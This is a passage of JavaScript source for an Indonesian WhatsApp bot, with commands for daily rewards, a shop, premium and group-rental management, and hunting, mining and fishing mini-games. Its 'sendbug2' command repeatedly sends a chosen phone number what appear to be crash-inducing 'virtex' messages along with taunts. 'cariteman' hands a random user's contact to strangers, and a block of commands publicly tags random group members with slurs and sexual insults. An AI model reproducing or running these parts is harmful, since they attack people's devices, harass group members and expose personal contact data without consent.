if (checkClaim(senderNumber, _claim)) return setReply(mess.claimOn+getClaim(senderNumber, _claim))
let htgm6 = randomNomor(2500)
let htgm7 = randomNomor(20)
addBalance(senderNumber, htgm6, user)
giveLimit(sender, htgm7, user)
addUserClaim("1d", timeWib, pushname, senderNumber, _claim)
setReply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *${htgm7}* Limit & Uang Rp *${htgm6.toLocaleString()}* 
Dari claim harian`)
}
break

case  'shop':{
let teks = `
]────「 SHOP」────[

Halo ${pushname} 
Saldo : Rp ${getBalance(senderNumber, user)}

• List Harga
1 Limit : Rp 1000
1 Limit Game : Rp 750
1 Jam Premium : Rp 50,000

NOTE :
Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
Contoh : ${prefix}buylimit 10

Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
Contoh : ${prefix}buyglimit 10`
setReply(teks)
}
break

    
case 'banuser':
if (!isOwner) return setReply(mess.only.Bowner)
if(!q) return setReply(`Masukan Id whatsapp`)
let nama = await xdev.getName(q)
if(cekBannedUser (q, ban)) return setReply("Udah di ban kak")
addBanned(nama,calender,  q, ban)               
teks =`
Kamu telah di banned karena
menyalahgunakan Fitur _*reportbug*_

Nama: ${nama}
Nomer: ${q.split("@")[0]}
Tanggal: ${calender}
Total Banned : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}

${copyright}`
await xdev.sendMessage(q,{text: teks})

break

case  'addprem':
if (!isOwner) return onlyOwner()

if (mentionByReply && isGroup) {
if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
 //if(_prem.checkPremiumUser (mentionByReply, premium)) return setReply("User tersebut sudah di premium")   
_prem.addPremiumUser (mentionByReply, q, premium)         
 setReply(`Succes add premium ${mentionByReply.split("@")[0]}`)
await xdev.sendButMessage(mentionByReply, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
 } else if(mentionByTag && isGroup) { 
let waktu = q.split(" ")[1]
 //if(_prem.checkPremiumUser (mentionByTag, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (mentionByTag, waktu, premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await xdev.sendButMessage(mentionByTag, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else if(!isGroup){
let usernya = q.split("|")[0] +"@s.whatsapp.net"
let waktunya = q.split("|")[1]

// if(_prem.checkPremiumUser (usernya, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (usernya, waktunya, premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await xdev.sendButMessage(usernya, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else setReply("Tag atau Reply usernya")
break

case 'cekprem': case 'cekpremium':
                   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                   let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                   let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
 setReply(premiumnya)
                     break
  


 case 'delprem':
if (!isOwner) return onlyOwner()
if(Input){
 if(!_prem.checkPremiumUser (Input, premium)) return setReply("Maap kak user tersebut tidak ada di database") 
_prem.delPremiumUser (Input, premium)
setReply(`Succes delete premium ${Input.split("@")[0]}`)          
   
} else setReply("Tag/Reply/Input nomer target")
break



case 'listprem':{
                   let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
                   let men = [];
                   for (let i of premium){
                   men.push(i.id)
                   let cekvip = ms(i.expired - Date.now())
                   txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
                   }
                   mentions(txt, men, true)
                   }
                   break



  
 case  'sendbug2':
try{
if(!isOwner) return onlyOwner()
let Pe = Input
console.log(Pe)
if(!Pe ) return setReply("Masukan nomer target")
if(Pe == Ownerin) return setReply("SendBug Gagal")
await setReply(`Sending bug, waktu selesai 20 detik`)
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
for (let i = 0; i < 10; i++) {
await sleep(2000)
console.log("sending")
await xdev.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
await xdev.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: a });
await xdev.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: lep });
}
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break      

case  'addsewa':{
 if(!isGroup){


const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;

let LinkGc = q.split(" ")[0];
let Second = q.split(" ")[1];
  let code = LinkGc.match(rex1);
if (code == null) return  setReply("No invite url detected.");

let kode = code[0].replace("chat.whatsapp.com/", "");
await xdev.groupAcceptInvite(kode)
let { id, subject,creator,creation,desc,descId } = await xdev.groupGetInviteInfo(kode).catch(async () => {
return setReply("Invalid invite url.");
});
setReply(`Sukses`)

await xdev.sendButMessage(id, `HALO KAK AKU ${fake}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
await _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
} else if(isGroup){
if(!q) return setReply("Maukian angka 1m/1d/1h")
if (isBotGroupAdmins) {
let linkgc = await xdev.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(!isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} 
_sewa.addSewaGroup(from, groupName, yeh, q, sewa)
setReply("Berhasil Add Sewa ke group")
}
}
break


case 'inspect':{
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let { id, subject,creator,creation,desc,descId } = await xdev.inspectLink(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
setReply(text)

}
break

case 'givesaldo':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
addBalance(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil menambakan saldo ke nomer ${mentionByReply.split("@")[0]}`)
}
break

case 'kurangsaldo':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
kurangBalance(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil mengurangi saldo ke nomer ${mentionByReply.split("@")[0]}`)
}
break

case 'kuranglimit':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
limitAdd(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil mengurangi limit ke nomer ${mentionByReply.split("@")[0]}`)
}
break

case 'kurangexp':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
resetLevelingXp(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil mengurangi exp ke nomer ${mentionByReply.split("@")[0]}`)
}
break    

case 'addexp':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
addLevelingLevel(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil menambah exp ke nomer ${mentionByReply.split("@")[0]}`)
}
break    

case 'addlevel':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
userLevel(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil menambah exp ke nomer ${mentionByReply.split("@")[0]}`)
}
break 

case 'givelimitmenfess':{
if(!isOwner) return setReply(mess.only.owner)
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
giveTes(mentionByReply.split("@")[0], math(q), user)
setReply(`Berhasil menambah exp ke nomer ${mentionByReply.split("@")[0]}`)
}
break 
  

case  'menfess':
    case  'menfes':
    case  'confess':
    case  'confes':
    case 'pesanrahasia':
    if (isGroup) return setReply('tidak dapan di gunakan di dalam group! private chat only.')
           if (args.length < 1) return setReply(`Penggunaan ${prefix}menfess 62xnxx|nama pengirim|pesan`)
			if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')
    if (getTes(senderNumber) < 1) return setReply(`limit mu habis cok haha`)
            var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
            var org = q.split("|")[1];
            var dari = q.split("|")[2];
            var pesan = `-== BOT Confess ==-\nhai, kamu dapet pesan rahasia nihh\n\ndari: ${org} \nIsi pesan: \n "${dari}"\n\ntidak ingin membalasnya?\nketik: .stop`
var input = nomor+'@s.whatsapp.net'
let ap = q.replace("|")[0]
//if(!ap.startsWith("+62")) return setReply("masukan dengan benar. contoh: .menfess +62851xnxx|dari siapa|isi pesannya")

let id = + new Date
const obj = {
id,
a: m.sender,
b: input,
state: "CHATTING",
expired: "INFINITY"
}

anonChat.push(obj)
    tesKurang(senderNumber, 1)

            xdev.sendMessage(nomor+'@s.whatsapp.net', {text: pesan})
    let repli = `*Berhasil mengirim pesan ke nomer ${nomor}\n tidak di balas? ketik .stop*`
    let repli2 = `_Menunggu crush kamu membalas chat_`
            setReply(repli)
    setReply(repli2)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

            break //org itu darinya, dari itu pesan hehe

case 'cariteman':
let teman = pickRandom(user) 
let namTemen = teman.name
let nomerTemen = teman.id
setTimeout( () => {
setReply("Sedang mencari....")
},1000)  
setTimeout( () => {
setReply("Berhasil mendapatkan satu org")
},5000)  
setTimeout( () => {           
xdev.sendContact(from, nomerTemen.split("@")[0], namTemen)
},9000)  
break

case 'leaderboard':
{      
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
setReply(txt)       
}
break
case 'mining': case 'nambang':{
if (!isInventory){ addInventori(senderNumber) }
if (isCekDarah < 1) return setReply('Kamu kelelahan!, cobalah heal menggunakan potion') 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]  
var emasnya = emas[Math.floor(Math.random() * emas.length)]  
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
setTimeout( () => {
let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
{
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang lagi⛏️'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: './media/image/rpg/tambang.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })  
}, 7000)  
setTimeout( () => {
setReply(`${senderNumber} Mulai menambang🎣`)     
}, 1500)
kurangDarah(senderNumber, 10)
addBesi(senderNumber, besinya)
addEmas(senderNumber, emasnya)
addEmerald(senderNumber, emeraldnya)	     
}   
break  
case 'beli': case 'buy':{
if (!isInventoriBuruan){ addInventoriBuruan(senderNumber) } 
if (!isInventoryMonay){ addInventoriMonay(senderNumber) }
if (!isInventory){ addInventori(senderNumber) }
if (!q) return setReply('Mau beli apa?\n*Berikut listnya*\n> potion\n> umpan\n> limit')
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
addPotion(senderNumber, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Potion kamu* : ${getPotion(senderNumber)}`)
}, 2000) 
} else 
if (args[0] === 'umpan'){
let noh = 5000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
addUmpan(senderNumber, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Umpan kamu* : ${getUmpan(senderNumber)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(senderNumber, noh)
var apalu = anu * 1
giveLimit(senderNumber, apalu, user)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(senderNumber)}\n*Limit kamu* : ${getLimit(senderNumber)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'sel': case 'jual':{//BY LORD RIFZA
if (!q) return setReply(`Mau jual apa?\n*Kamu bisa yang ada di list berikut*\n> ikan\n> ayam\n> kelinci\n> domba\n> sapi\n> gajah\n> besi\n> emas\n> emerald`)
if (!isInventoriBuruan){ addInventoriBuruan(senderNumber) } 
if (!isInventoryMonay){ addInventoriMonay(senderNumber) }
if (!isInventory){ addInventori(senderNumber) }
var anu = args[1]
if (args[0] === 'ikan'){
if (isIkan < anu) return setReply('Ikan kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
kurangIkan(senderNumber, anu)
let monaynya = 1500 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Ikan kamu* : ${getIkan(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'ayam'){
if (isAyam < anu) return setReply('Ayam kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
kurangAyam(senderNumber, anu)
let monaynya = 2500 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Ayam kamu* : ${getAyam(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'kelinci'){
if (isKelinci < anu) return setReply('Kelinci kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
kurangKelinci(senderNumber, anu)
let monaynya = 3000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Kelinci kamu* : ${getKelinci(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'domba'){
if (isDomba < anu) return setReply('Domba kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
kurangDomba(senderNumber, anu)
let monaynya = 5000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Domba kamu* : ${getDomba(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'sapi'){
if (isSapi < anu) return setReply('Sapi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
kurangSapi(senderNumber, anu)
let monaynya = 10000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Sapi kamu* : ${getSapi(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'gajah'){
if (isGajah < anu) return setReply('Gajah kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
kurangSapi(senderNumber, anu)
let monaynya = 15000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Gajah kamu* : ${getGajah(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'besi'){
if (isBesi < anu) return setReply('Besi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
kurangBesi(senderNumber, anu)
let monaynya = 16000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa Besi kamu* : ${getBesi(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'emas'){
if (isEmas < anu) return setReply('Emas kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
kurangEmas(senderNumber, anu)
let monaynya = 50000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa emas kamu* : ${getEmas(senderNumber)}`)
}, 2000) 
} else
if (args[0] === 'emerald'){
if (isEmerald < anu) return setReply('Emerald kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
kurangEmerald(senderNumber, anu)
let monaynya = 100000 * anu
addMonay(senderNumber, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(senderNumber)}\n*Sisa emerald kamu* : ${getEmerald(senderNumber)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'heal':{
if (!isCekDarah < 1) return setReply('Kamu hanya bisa heal ketika darah kamu 0')
if (isCekDarah > 100) return setReply('Darah kamu sudah penuh')
if (isPotion < 1) return setReply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_') 
addDarah(senderNumber, 100)
kurangPotion(senderNumber, 1)
setReply('Berhasil, darah kamu sudah full')
}
break
case 'berburu':{
if (!isDarah){ addInventoriDarah(senderNumber, DarahAwal) }
if (isCekDarah < 1) return setReply('Darah kamu habis, cobalah heal menggunakan potion') 
if (!isInventoriBuruan){ addInventoriBuruan(senderNumber) } 
let luka = ["Tertusuk duri saat berburu","Terpeleset ke jurang saat berburu","Tercakar hewan buas","Tidak berhati-hati","Terjerat akar","Terjatuh saat berburu"]
let location = ["Hutan rimba","Hutan Amazon","Hutan tropis","Padang rumput","Hutan afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Hutan rimba') {
var image = './media/image/rpg/rimba.jpg'
} else
if (lokasinya === 'Hutan Amazon') {
var image =  './media/image/rpg/amazon.jpg'
} else
if (lokasinya === 'Hutan tropis') {
var image = './media/image/rpg/tropis.jpg'
} else
if (lokasinya === 'Padang rumput') {
var image = './media/image/rpg/padang_rumput.jpg'
} else
if (lokasinya === 'Hutan afrika') {
var image = './media/image/rpg/afrika.jpg'
} else
if (lokasinya === 'Pegunungan') {
var image = './media/image/rpg/pegunungan.jpg'
}
setTimeout( () => {
let teksehmazeh = `_[ HASIL BURUAN ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
teksehmazeh += `*Sisa darah* : ${getDarah(senderNumber)}\n`
let buttons = [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: 'Berburu lagi️🏹'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: image },
caption: teksehmazeh,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })      
}, 5000)  
setTimeout( () => {
setReply(`${senderNumber} Mulai berburu di ${lokasinya}`)     
}, 1000) 
addIkan(senderNumber, ikanmu) 
addAyam(senderNumber, ayam) 
addKelinci(senderNumber, kelinci)
addDomba(senderNumber, domba)
addSapi(senderNumber, sapi)
addGajah(senderNumber, gajah)
kurangDarah(senderNumber, 10)
}
break
case 'inventori':
    case 'inventory':{
if (!isDarah){ addInventoriDarah(senderNumber, DarahAwal) }
if (!isInventory){ addInventori(senderNumber) }
if (!isInventoriBuruan){ addInventoriBuruan(senderNumber) }  
let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
teksehmazeh += `*❤️Darah kamu* : ${getDarah(senderNumber)}\n`
teksehmazeh += `*◻️️Besi kamu* : ${getBesi(senderNumber)}\n`
teksehmazeh += `*🌟Emas Kamu* : ${getEmas(senderNumber)}\n`
teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(senderNumber)}\n`
teksehmazeh += `*🧪Potion Kamu* : ${getPotion(senderNumber)}\n\n`
teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
teksehmazeh += `*🐟Ikan* : ${getIkan(senderNumber)}\n`
teksehmazeh += `*🐔Ayam* : ${getAyam(senderNumber)}\n`
teksehmazeh += `*🐇Kelinci* : ${getKelinci(senderNumber)}\n`
teksehmazeh += `*🐑Domba* : ${getDomba(senderNumber)}\n`
teksehmazeh += `*🐄Sapi* : ${getSapi(senderNumber)}\n`
teksehmazeh += `*🐘Gajah* : ${getGajah(senderNumber)}\n\n`
teksehmazeh += `_*${botName}*_`  
setReply(teksehmazeh)
}
break
case 'mancing':{
if (!isInventoriBuruan){ addInventoriBuruan(senderNumber) } 
if (isUmpan < 1) return setReply('Umpan kamu habis!, cobalah berburu dan ubah dagingnya menjadi umpan')
setReply("1 umpan terpakai")
var ikannya = ikan[Math.floor(Math.random() * ikan.length)]
var ditangkap = Math.ceil(Math.random() * 20)
setTimeout( () => {
let caption = `Hasil tangkapan : ${ikannya}\n> Jumlah tangkapan : ${ditangkap}`
let buttons = [
{
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Mancing lagi🎣'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: './media/image/rpg/mancing.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })   
}, 7000)  
setTimeout( () => {
setReply(`${senderNumber} Mulai memancing🎣`)     
}, 1500)
kurangUmpan(senderNumber, 1)
addIkan(senderNumber, ditangkap)	     
}   
break  
case 'darah':{
if (!isDarah){ addInventoriDarah(senderNumber, DarahAwal) }
let dapat =  getDarah(senderNumber)
setReply(`${dapat}`)
}
break


case 'ngewe':
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'pantex':
case 'pantek': {
if (!isGroup) return onlyGroup() 
let member = participants.map(u => u.id)
let org = member[Math.floor(Math.random() * member.length)]
xdev.sendMessage(from, { text: `yang paling ${command} di sini adalah @${org.split("@")[0]}`, mentions: [org]}, { quoted: setQuoted }) 
}
break
case 'jadian': {
if (!isGroup) return setReply(mess.only.group) 
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee Yang Jadian💖 Jangan Lupa Pajak Jadiannya Yaa🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
xdev.sendMessage(from, { text: jawab, mentions: menst }) 
}
break



case  'delchat':
//const lastMsgInChat = await xdev.getLastMessageInChat(from) // implement this on your end
await xdev.chatModify({
  delete: true,
  lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
},
from)
setReply("Sukses")
break

case  'song': {
if (q === 'help') {
return m.reply(`❗Command: ${command}\n*🧩Category:* Search\n*🛠️Usage:* ${prefix + command} back in black\n\n*📚Description:* Sends song in Whatsapp `)
}
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} Back in black`)
let search = await yts(args.join(" "))
let listSerch = []
let teskd = `\n📂Result From ${args.join(" ")}.\n\n*Select any Song🎵*`
for (let i of search.all) {
listSerch.push({
title: i.title,
rowId: `${prefix}ytmp3 ${i.url}`,
description: `Author : ${i.author.name} / ${i.timestamp}`
})
}
const sections = [
{
title: "Total Search🔍" + search.all.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `📂Youtube Search by ${copyright} 𝐌𝐝`,
buttonText: "FOUND",
sections
}
xdev.sendMessage(from, listMessage, {quoted: m})
}
break

case  'listsewa': 
case 'listorder':
let ordernye = `List Sewa\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvipp = ms(i.expired - Date.now())
ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
 } 
ordernye += `© ${fake1}`
setReply(ordernye)
break

case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return setReply(mess.only.group)
									if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 SEWA EXPIRE 」
Group: ${groupName}
ID: ${from}
EXPIRE : ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
									setReply(sewenye)
									break

case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
           let ter = command[1].toLowerCase()
